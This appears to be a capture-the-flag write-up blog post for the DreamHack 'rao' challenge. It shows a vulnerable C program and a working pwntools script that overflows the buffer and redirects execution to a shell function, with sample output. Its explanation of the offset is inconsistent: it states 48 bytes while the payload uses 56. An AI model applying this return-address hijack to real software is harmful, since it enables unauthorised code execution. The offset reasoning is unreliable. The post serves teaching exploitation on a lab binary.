---
title: "DreamHack PwnTools Notes – Explained"
date: 2025-04-29 02:30:00 +0700
categories: "Pwn Notes"
tags: [pwntools, pwn, notes]
---

> _This post walks through a simple `pwntools` exploitation setup using the DreamHack `rao` example._

## Setup Overview

We’re given a basic C program (`rao.c`) that has a classic **stack-based buffer overflow** vulnerability. Here's the code:

```c
// Compile: gcc -o rao rao.c -fno-stack-protector
#include <stdio.h>
#include <unistd.h>

void get_shell() {
    char *cmd = "/bin/sh";
    char *args[] = {cmd, NULL};
    execve(cmd, args, NULL);
}

int main() {
    char buf[0x28];
    printf("Input: ");
    scanf("%s", buf);
    return 0;
}
```

### Important Notes:

- Stack protection (`-fno-stack-protector`) is **explicitly disabled**.
- The buffer is 0x28 (40) bytes long, and uses an unsafe `scanf("%s")` which receives unlimited input length, making it **vulnerable to overflow**.
- We want to overwrite the return address to point to `get_shell()`.

---

## Writing the Exploit – `rao.py`

```python
#!/usr/bin/python3

from pwn import *

p = process('./rao')            # Spawn process for local testing

elf = ELF('./rao')              # Load ELF structure
get_shell = elf.symbols['get_shell']  # Get address of 'get_shell'

payload = b'A'*0x30             # Overflow buffer (0x28) + SFP padding (0x8)
payload += b'B'*0x8
payload += p64(get_shell)       # Overwrite return address

p.sendline(payload)             # Send payload
p.interactive()                 # Get interactive shell
```

### Why `b'A'*0x30 + b'B'*0x8`?

| Address Range               | Stack Content  |
| --------------------------- | -------------- |
| [lower addresses] (top)     |                |
|                             | buf[0]         |
|                             | ...            |
|                             | buf[39]        |
|                             | saved RBP      |
| [higher addresses] (bottom) | return address |

- `0x28` (40) is the size of the buffer, so when we use `0x30` (48), we pad to the LSB of SFP.
- Saved Frame Pointer (SFP) adds another `0x8` bytes, which pad to the LSB of `ret`.
- Here, with the help of `p64()`, we convert the address of `get_shell()` to a 64-bit format, therefore overwrite the return address.
- Total offset before return address: **48 bytes (`0x30`)**.

---

## Key Concepts Recap

| Concept                       | Explanation                                                  |
| ----------------------------- | ------------------------------------------------------------ |
| **Buffer Overflow**           | Overwriting stack memory by writing past the end of a buffer |
| **Return Address Hijack**     | Redirecting code execution to attacker-chosen address        |
| **SFP (Saved Frame Pointer)** | Stored base pointer (can be padding in overflow)             |
| **Pwntools**                  | Python toolset for binary exploitation                       |

---

## Running It

```bash
$ python3 rao.py
[+] Starting local process './rao': pid 416
[*] Switching to interactive mode
$ whoami
$ id
```

If everything works, you’ll get a shell, proving that control has been hijacked successfully.

---

## Resources

- Challenge Link: [DreamHack: rao](https://dreamhack.io/wargame/challenges/351/)
- [Pwntools Documentation](https://docs.pwntools.com/en/stable/)

---
